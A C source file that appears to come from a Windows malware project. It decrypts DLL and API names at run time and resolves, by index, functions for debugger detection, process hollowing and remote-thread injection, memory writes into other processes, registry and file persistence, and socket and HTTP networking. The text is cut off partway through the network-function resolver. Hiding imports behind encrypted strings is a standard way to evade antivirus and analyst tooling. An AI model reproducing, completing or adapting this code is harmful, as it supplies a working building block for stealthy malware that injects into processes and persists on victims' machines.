#include <Windows.h>
#include <stdio.h>

#include "function_table_core.h"
#include "functions_table_constants.h"
#include "functions_table_utils.h"

#include "functions_table.h"

#include "global_config.h"
#include "crypto.h"

#include "debug.h"

#pragma warning(disable:4996)


void get_function_pointer_helper(FARPROC* function_pointer, char* calling_function, HMODULE dll_hmodule, char* TARGET_FUNCTION_STR, int TARGET_FUNCTION_STR_LEN)
{
	char* decrypted_function_name = NULL;

	decrypt_to_string(&decrypted_function_name, TARGET_FUNCTION_STR, TARGET_FUNCTION_STR_LEN);

	DBG_MSG("%s() - decrypted_function_name: %s\n", calling_function, decrypted_function_name);

	*function_pointer = l_GetProcAddress(dll_hmodule, decrypted_function_name);

	if (*function_pointer == NULL) {
		DBG_MSG("%s() - l_GetProcAddress() for name: %s failed, error code: %d\n", calling_function, decrypted_function_name, l_GetLastError());

		//
		free(decrypted_function_name);
		return;
	}

	//
	DBG_MSG("%s() - l_GetProcAddress() success. Function name: %s, Address: 0x%p \n", calling_function, decrypted_function_name, *function_pointer);
	free(decrypted_function_name);
}

FARPROC get_function_pointer_kernel32_dll(int function_index)
{
	//
	char* decrypted_kernel32_dll_string = NULL;

	decrypt_to_string(&decrypted_kernel32_dll_string, KERNEL32_DLL_STRING, KERNEL32_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_kernel32_dll() - decrypted_kernel32_dll_string: %s\n", decrypted_kernel32_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_kernel32_dll_string);

	//
	free(decrypted_kernel32_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_kernel32_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}


	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

		// IsDebuggerPresent()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, IsDebuggerPresent_STRING, IsDebuggerPresent_STRING_LEN);
		return function_pointer;
	}
	break;

	// CheckRemoteDebuggerPresent()
	case 2:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CheckRemoteDebuggerPresent_STRING, CheckRemoteDebuggerPresent_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetVersionEx()
	case 3:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetVersionEx_STRING, GetVersionEx_STRING_LEN);
		return function_pointer;
	}
	break;

	// CreateProcessA()
	case 4:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateProcessA_STRING, CreateProcessA_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetTempPathA()
	case 5:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetTempPathA_STRING, GetTempPathA_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetTempFileNameA()
	case 6:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetTempFileNameA_STRING, GetTempFileNameA_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_Sleep()
	case 7:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, Sleep_STRING, Sleep_STRING_LEN);
		return function_pointer;
	}
	break;

	// CreateMutexA()
	case 8:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateMutexA_STRING, CreateMutexA_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_GetLastError()
	case 9:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetLastError_STRING, GetLastError_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetModuleFileNameA()
	case 10:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetModuleFileNameA_STRING, GetModuleFileNameA_STRING_LEN);
		return function_pointer;
	}
	break;

	// CreateDirectoryA()
	case 11:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateDirectoryA_STRING, CreateDirectoryA_STRING_LEN);
		return function_pointer;
	}
	break;

	// CopyFileA()
	case 12:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CopyFileA_STRING, CopyFileA_STRING_LEN);
		return function_pointer;
	}
	break;

	// SetFileAttributesA()
	case 13:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, SetFileAttributesA_STRING, SetFileAttributesA_STRING_LEN);
		return function_pointer;
	}
	break;

	// RegCreateKeyExA()
	case 14:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, RegCreateKeyExA_STRING, RegCreateKeyExA_STRING_LEN);
		return function_pointer;
	}
	break;


	// RegSetValueExA()
	case 15:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, RegSetValueExA_STRING, RegSetValueExA_STRING_LEN);
		return function_pointer;
	}
	break;

	// RegCloseKey()
	case 16:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, RegCloseKey_STRING, RegCloseKey_STRING_LEN);
		return function_pointer;
	}
	break;


	// GetCurrentDirectoryA()
	case 17:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetCurrentDirectoryA_STRING, GetCurrentDirectoryA_STRING_LEN);
		return function_pointer;
	}
	break;


	// CreateFileA()
	case 18:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateFileA_STRING, CreateFileA_STRING_LEN);
		return function_pointer;
	}
	break;

	// DeviceIoControl()
	case 19:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, DeviceIoControl_STRING, DeviceIoControl_STRING_LEN);
		return function_pointer;
	}
	break;


	// IsWow64Process()
	case 20:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, IsWow64Process_STRING, IsWow64Process_STRING_LEN);
		return function_pointer;
	}
	break;


	// GetCurrentProcess()
	case 21:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetCurrentProcess_STRING, GetCurrentProcess_STRING_LEN);
		return function_pointer;
	}
	break;

	// DeleteFileA()
	case 22:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, DeleteFileA_STRING, DeleteFileA_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetCurrentProcessId()
	case 23:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetCurrentProcessId_STRING, GetCurrentProcessId_STRING_LEN);
		return function_pointer;
	}
	break;


	// FreeConsole()
	case 24:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, FreeConsole_STRING, FreeConsole_STRING_LEN);
		return function_pointer;
	}
	break;


	// GetFileSize()
	case 25:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetFileSize_STRING, GetFileSize_STRING_LEN);
		return function_pointer;
	}
	break;

	// ReadFile()
	case 26:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, ReadFile_STRING, ReadFile_STRING_LEN);
		return function_pointer;
	}
	break;


	// l_VirtualAllocEx()
	case 27:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, VirtualAllocEx_STRING, VirtualAllocEx_STRING_LEN);
		return function_pointer;
	}
	break;


	// CreateFileW()
	case 28:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateFileW_STRING, CreateFileW_STRING_LEN);
		return function_pointer;
	}
	break;


	// MapViewOfFile()
	case 29:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, MapViewOfFile_STRING, MapViewOfFile_STRING_LEN);
		return function_pointer;
	}
	break;

	// CreateFileMappingW()
	case 30:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateFileMappingW_STRING, CreateFileMappingW_STRING_LEN);
		return function_pointer;
	}
	break;

	// UnmapViewOfFile()
	case 31:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, UnmapViewOfFile_STRING, UnmapViewOfFile_STRING_LEN);
		return function_pointer;
	}
	break;

	// CloseHandle()
	case 32:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CloseHandle_STRING, CloseHandle_STRING_LEN);
		return function_pointer;
	}
	break;

	// WriteFile()
	case 33:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, WriteFile_STRING, WriteFile_STRING_LEN);
		return function_pointer;
	}
	break;

	// VirtualProtectEx()
	case 34:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, VirtualProtectEx_STRING, VirtualProtectEx_STRING_LEN);
		return function_pointer;
	}
	break;

	// CreateThread()
	case 35:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateThread_STRING, CreateThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetProcessId()
	case 36:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetProcessId_STRING, GetProcessId_STRING_LEN);
		return function_pointer;
	}
	break;

	// WaitForSingleObject()
	case 37:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, WaitForSingleObject_STRING, WaitForSingleObject_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetExitCodeThread()
	case 38:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetExitCodeThread_STRING, GetExitCodeThread_STRING_LEN);
		return function_pointer;
	}
	break;


	// SuspendThread()
	case 39:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, SuspendThread_STRING, SuspendThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetProcessHeaps()
	case 40:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetProcessHeaps_STRING, GetProcessHeaps_STRING_LEN);
		return function_pointer;
	}
	break;

	// VirtualProtect()
	case 41:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, VirtualProtect_STRING, VirtualProtect_STRING_LEN);
		return function_pointer;
	}
	break;

	// ResumeThread()
	case 42:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, ResumeThread_STRING, ResumeThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetProcessHeap()
	case 43:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetProcessHeap_STRING, GetProcessHeap_STRING_LEN);
		return function_pointer;
	}
	break;

	// HeapAlloc()
	case 44:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, HeapAlloc_STRING, HeapAlloc_STRING_LEN);
		return function_pointer;
	}
	break;

	// HeapFree()
	case 45:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, HeapFree_STRING, HeapFree_STRING_LEN);
		return function_pointer;
	}
	break;

	// HeapWalk()
	case 46:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, HeapWalk_STRING, HeapWalk_STRING_LEN);
		return function_pointer;
	}
	break;

	// VirtualQueryEx()
	case 47:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, VirtualQueryEx_STRING, VirtualQueryEx_STRING_LEN);
		return function_pointer;
	}
	break;

	// DuplicateHandle()
	case 48:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, DuplicateHandle_STRING, DuplicateHandle_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_VirtualAlloc()
	case 49:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, VirtualAlloc_STRING, VirtualAlloc_STRING_LEN);
		return function_pointer;
	}
	break;

	// VirtualFree()
	case 50:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, VirtualFree_STRING, VirtualFree_STRING_LEN);
		return function_pointer;
	}
	break;

	// GetSystemInfo()
	case 51:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetSystemInfo_STRING, GetSystemInfo_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_VirtualQuery()
	case 52:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, VirtualQuery_STRING, VirtualQuery_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_ExitProcess()
	case 53:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, ExitProcess_STRING, ExitProcess_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_GetCurrentThread()
	case 54:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetCurrentThread_STRING, GetCurrentThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_GetComputerNameA()
	case 55:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetComputerNameA_STRING, GetComputerNameA_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_TerminateProcess()
	case 56:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, TerminateProcess_STRING, TerminateProcess_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_OpenProcess()
	case 57:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, OpenProcess_STRING, OpenProcess_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_EnumProcesses()
	// WARNING & TODO: 
	/*
	Kernel32.dll on Windows 7 and Windows Server 2008 R2; Psapi.dll (if PSAPI_VERSION=1) on Windows 7 and Windows Server 2008 R2; Psapi.dll on Windows Server 2008,
	Windows Vista, Windows Server 2003 and Windows XP
	*/
	case 58:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, EnumProcesses_STRING, EnumProcesses_STRING_LEN);
		return function_pointer;
	}
	break;

	//
	case 59:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetExitCodeProcess_STRING, GetExitCodeProcess_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_GetProcessTimes
	case 60:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetProcessTimes_STRING, GetProcessTimes_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_EnumProcessModules()
	// WARNING & TODO: 
	/*
	Kernel32.dll on Windows 7 and Windows Server 2008 R2; Psapi.dll (if PSAPI_VERSION=1) on Windows 7 and Windows Server 2008 R2; Psapi.dll on Windows Server 2008,
	Windows Vista, Windows Server 2003 and Windows XP
	*/
	case 61:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, EnumProcessModules_STRING, EnumProcessModules_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_GetModuleFileNameExA()
	// WARNING & TODO: 
	/*
	Kernel32.dll on Windows 7 and Windows Server 2008 R2; Psapi.dll (if PSAPI_VERSION=1) on Windows 7 and Windows Server 2008 R2; Psapi.dll on Windows Server 2008,
	Windows Vista, Windows Server 2003 and Windows XP
	*/
	case 62:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetModuleFileNameExA_STRING, GetModuleFileNameExA_STRING_LEN);
		return function_pointer;
	}
	break;

	//
	case 63:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, ReadProcessMemory_STRING, ReadProcessMemory_STRING_LEN);
		return function_pointer;
	}
	break;

	//
	case 64:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, WriteProcessMemory_STRING, WriteProcessMemory_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_GetModuleBaseNameA()
	// WARNING & TODO: 
	/*
	Kernel32.dll on Windows 7 and Windows Server 2008 R2; Psapi.dll (if PSAPI_VERSION=1) on Windows 7 and Windows Server 2008 R2; Psapi.dll on Windows Server 2008,
	Windows Vista, Windows Server 2003 and Windows XP
	*/
	case 65:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetModuleBaseNameA_STRING, GetModuleBaseNameA_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_CreateRemoteThread()
	case 66:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateRemoteThread_STRING, CreateRemoteThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_GetThreadContext()
	case 67:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, GetThreadContext_STRING, GetThreadContext_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_SetThreadContext()
	case 68:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, SetThreadContext_STRING, SetThreadContext_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_LockResource()
	case 69:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, LockResource_STRING, LockResource_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_LoadResource()
	case 70:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, LoadResource_STRING, LoadResource_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_FindResourceW()
	case 71:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, FindResourceW_STRING, FindResourceW_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_SizeofResource()
	case 72:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, SizeofResource_STRING, SizeofResource_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_CreateToolhelp32Snapshot()
	case 73:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, CreateToolhelp32Snapshot_STRING, CreateToolhelp32Snapshot_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_Process32First()
	case 74:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, Process32First_STRING, Process32First_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_Process32NextW()
	case 75:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_kernel32_dll", handle, Process32NextW_STRING, Process32NextW_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;
	}

	return NULL;
}

FARPROC get_function_pointer_ole32_dll(int function_index)
{
	//
	char* decrypted_ole32_dll_string = NULL;

	decrypt_to_string(&decrypted_ole32_dll_string, OLE32_DLL_STRING, OLE32_DLL_STRING_LEN);

	DBG_MSG("decrypted_ole32_dll_string() - decrypted_ole32_dll_string: %s\n", decrypted_ole32_dll_string);

	//
	l_LoadLibraryA(decrypted_ole32_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_ole32_dll_string);


	//
	free(decrypted_ole32_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_ole32_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

		// CoInitializeEx()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ole32_dll", handle, CoInitializeEx_STRING, CoInitializeEx_STRING_LEN);
		return function_pointer;
	}
	break;

	// CoUninitialize()
	case 2:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ole32_dll", handle, CoUninitialize_STRING, CoUninitialize_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;

	}

}


FARPROC get_function_pointer_shell32_dll(int function_index)
{
	//
	char* decrypted_shell32_dll_string = NULL;

	decrypt_to_string(&decrypted_shell32_dll_string, SHELL32_DLL_STRING, SHELL32_DLL_STRING_LEN);

	DBG_MSG("decrypted_ole32_dll_string() - decrypted_shell32_dll_string: %s\n", decrypted_shell32_dll_string);


	//
	l_LoadLibraryA(decrypted_shell32_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_shell32_dll_string);


	//
	free(decrypted_shell32_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_shell32_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

		// ShellExecuteExA()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_shell32_dll", handle, ShellExecuteExA_STRING, ShellExecuteExA_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;

	}

}


FARPROC get_function_pointer_shlwapi_dll(int function_index)
{
	//
	char* decrypted_shlwapi_dll_string = NULL;

	decrypt_to_string(&decrypted_shlwapi_dll_string, SHLWAPI_DLL_STRING, SHLWAPI_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_shlwapi_dll() - decrypted_shlwapi_dll_string: %s\n", decrypted_shlwapi_dll_string);

	//
	l_LoadLibraryA(decrypted_shlwapi_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_shlwapi_dll_string);


	//
	free(decrypted_shlwapi_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_shlwapi_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

		// PathFileExistsA()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_shlwapi_dll", handle, PathFileExistsA_STRING, PathFileExistsA_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;

	}

}


FARPROC get_function_pointer_ntdll_dll(int function_index)
{
	//
	char* decrypted_ntdll_dll_string = NULL;

	decrypt_to_string(&decrypted_ntdll_dll_string, NTDLL_DLL_STRING, NTDLL_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_ntdll_dll() - decrypted_ntdll_dll_string: %s\n", decrypted_ntdll_dll_string);

	//
	l_LoadLibraryA(decrypted_ntdll_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_ntdll_dll_string);


	//
	free(decrypted_ntdll_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_ntdll_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

		// NtTerminateProcess()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtTerminateProcess_STRING, NtTerminateProcess_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtReadVirtualMemory()
	case 2:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtReadVirtualMemory_STRING, NtReadVirtualMemory_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtWriteVirtualMemory()
	case 3:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtWriteVirtualMemory_STRING, NtWriteVirtualMemory_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtGetContextThread()
	case 4:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtGetContextThread_STRING, NtGetContextThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtSetContextThread()
	case 5:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtSetContextThread_STRING, NtSetContextThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtUnmapViewOfSection()
	case 6:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtUnmapViewOfSection_STRING, NtUnmapViewOfSection_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtResumeThread()
	case 7:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtResumeThread_STRING, NtResumeThread_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtClose()
	case 8:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtClose_STRING, NtClose_STRING_LEN);
		return function_pointer;
	}
	break;

	// NtQueryInformationProcess()
	case 9:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, NtQueryInformationProcess_STRING, NtQueryInformationProcess_STRING_LEN);
		return function_pointer;
	}
	break;

	// RtlGetVersion()
	case 10:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ntdll_dll", handle, RtlGetVersion_STRING, RtlGetVersion_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;

	}

}

//
FARPROC get_function_pointer_wininet_dll(int function_index)
{
	//
	char* decrypted_wininet_dll_string = NULL;

	decrypt_to_string(&decrypted_wininet_dll_string, WININET_DLL_STRING, WININET_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_wininet_dll() - decrypted_wininet_dll_string: %s\n", decrypted_wininet_dll_string);

	//
	l_LoadLibraryA(decrypted_wininet_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_wininet_dll_string);


	//
	free(decrypted_wininet_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_wininet_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index) {

		//l_InternetReadFile()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_wininet_dll", handle, InternetReadFile_STRING, InternetReadFile_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_InternetConnectA()
	case 2:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_wininet_dll", handle, InternetConnectA_STRING, InternetConnectA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_HttpSendRequestA()
	case 3:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_wininet_dll", handle, HttpSendRequestA_STRING, HttpSendRequestA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_InternetOpenA()
	case 4:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_wininet_dll", handle, InternetOpenA_STRING, InternetOpenA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_HttpOpenRequestA()
	case 5:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_wininet_dll", handle, HttpOpenRequestA_STRING, HttpOpenRequestA_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_InternetCloseHandle()
	case 6:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_wininet_dll", handle, InternetCloseHandle_STRING, InternetCloseHandle_STRING_LEN);
		return function_pointer;
	}
	break;


	//
	default:
		return NULL;
		break;

	}

}


//
//
FARPROC get_function_pointer_ws2_32_dll(int function_index)
{
	//
	char* decrypted_ws2_32_dll_string = NULL;

	decrypt_to_string(&decrypted_ws2_32_dll_string, WS2_32_DLL_STRING, WS2_32_DLL_STRING_LEN);

	DBG_MSG("get_function_pointer_ws2_32_dll() - decrypted_ws2_32_dll_string: %s\n", decrypted_ws2_32_dll_string);

	//
	l_LoadLibraryA(decrypted_ws2_32_dll_string);

	//
	HMODULE handle = l_GetModuleHandleA(decrypted_ws2_32_dll_string);


	//
	free(decrypted_ws2_32_dll_string);

	if (handle == NULL) {
		DBG_MSG("get_function_pointer_ws2_32_dll() - GetModuleHandle() failed, error code: %d\n", l_GetLastError());
		return NULL;
	}

	//
	FARPROC function_pointer = NULL;
	char* decrypted_function_name = NULL;


	switch (function_index)
	{
		// l_WSAGetLastError()
	case 1:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, WSAGetLastError_STRING, WSAGetLastError_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_WSAStartup()
	case 2:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, WSAStartup_STRING, WSAStartup_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_send()
	case 3:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, send_STRING, send_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_recv()
	case 4:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, recv_STRING, recv_STRING_LEN);
		return function_pointer;
	}
	break;

	// l_connect()
	case 5:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, connect_STRING, connect_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_setsockopt()
	case 6:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, setsockopt_STRING, setsockopt_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_socket()
	case 7:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, socket_STRING, socket_STRING_LEN);
		return function_pointer;
	}
	break;

	//htons()
	case 8:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, htons_STRING, htons_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_inet_pton()
	case 9:
	{
		get_function_pointer_helper(&function_pointer, "get_function_pointer_ws2_32_dll", handle, inet_pton_STRING, inet_pton_STRING_LEN);
		return function_pointer;
	}
	break;

	//l_closesocket()
	case 10:
	{
